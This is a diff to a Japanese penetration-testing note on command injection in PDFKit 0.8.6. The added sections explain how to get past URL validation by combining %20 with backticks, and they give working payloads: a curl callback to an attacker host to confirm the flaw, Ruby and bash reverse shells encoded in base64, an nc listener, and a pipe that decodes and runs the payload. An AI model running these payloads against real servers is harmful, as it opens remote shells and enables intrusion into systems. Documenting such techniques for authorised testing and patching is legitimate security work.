@@ -62,6 +62,71 @@ curl -X POST http://[TARGET]/ \
 
 **[ATTACKER_IP] にはテスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う（`ip a` で全インターフェース確認）。**
 
+---
+
+### URL 検証バイパス（"You should provide a valid URL!" が返る場合）
+
+アプリ側が URL を検証しており、バックティックのみの入力（例: `` http%20`sleep 5` ``）を弾いてくる場合がある。
+
+**症状：** フォームに `` http%20`sleep 5` `` を送ると "You should provide a valid URL!" などのエラーが返る。
+
+**バイパスの原理：** 多くの URL バリデーションは `scheme://host` の形式が整っているかだけを見る。`%20`（スペースの URL エンコード）をパスまたはクエリパラメータ区切りとして挟むことで、バックティックを「URLの続き」として扱わせつつ、ライブラリにはコマンドとして解釈させられる。
+
+**バイパス形式（テスター管理のサーバーを経由する方法）：**
+
+```
+http://[ATTACKER_IP]:[PORT]/%20`curl http://[ATTACKER_IP]:[PORT]/test`
+```
+
+- `http://[ATTACKER_IP]:[PORT]/` → バリデーションが通る valid な URL
+- `%20` → URL エンコードされたスペース（パスの一部として扱われる）
+- `` `curl ...` `` → pdfkit がシェルに渡す際にコマンドとして解釈される
+
+**事前確認（OOB で RCE を確認する手順）：**
+
+```bash
+# [Attacker] Step 1: HTTP サーバーを起動してコールバックを待つ
+python3 -m http.server [PORT]
+
+# [Attacker] Step 2: フォームに以下を入力して送信
+# http://[ATTACKER_IP]:[PORT]/%20`curl http://[ATTACKER_IP]:[PORT]/probe`
+
+# → HTTP サーバーのログに GET /probe が届けば RCE 確定
+```
+
+---
+
+### base64 エンコードペイロード（特殊文字・クォートが問題になる場合）
+
+リバースシェルペイロードにシングルクォート・スペース等の特殊文字が含まれると、URL や POST ボディの中でエスケープが崩れることがある。base64 でエンコードしてからデコード＋実行することで回避できる。
+
+**事前準備（必須）：**
+
+```bash
+# [Attacker] Step 1: リバースシェルコマンドを base64 エンコード
+# Ruby の場合
+echo -n "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"[ATTACKER_IP]\",[PORT]))'" | base64 -w 0
+# → [BASE64_STRING] が出力される
+
+# bash の場合
+echo -n 'bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1' | base64 -w 0
+# → [BASE64_STRING] が出力される
+
+# [Attacker] Step 2: nc リスナーを起動
+nc -lvnp [PORT]
+```
+
+**フォームへの入力（バイパス形式と組み合わせる）：**
+
+```
+http://[ATTACKER_IP]:[PORT]/%20`echo [BASE64_STRING] | base64 -d | bash`
+```
+
+**ポイント：**
+- バックエンドが Ruby なら Ruby ペイロードを選ぶ（`ruby -rsocket ...`）。bash が使えない環境でも Ruby は動くため、言語を合わせることで成功率が上がる
+- `-w 0` オプションは base64 出力の改行を抑制する（改行があるとデコードが失敗する）
+- base64 文字列自体はシェルメタ文字を含まないため、URL パラメータ内でエスケープの問題が発生しない
+
 ### 確認されたバージョン
 - PDFKit 0.8.6（Debian Bullseye / Ruby 2.7 環境で確認）
 - PDFKit 0.8.7 以降はパッチ済み（URL サニタイズ修正）
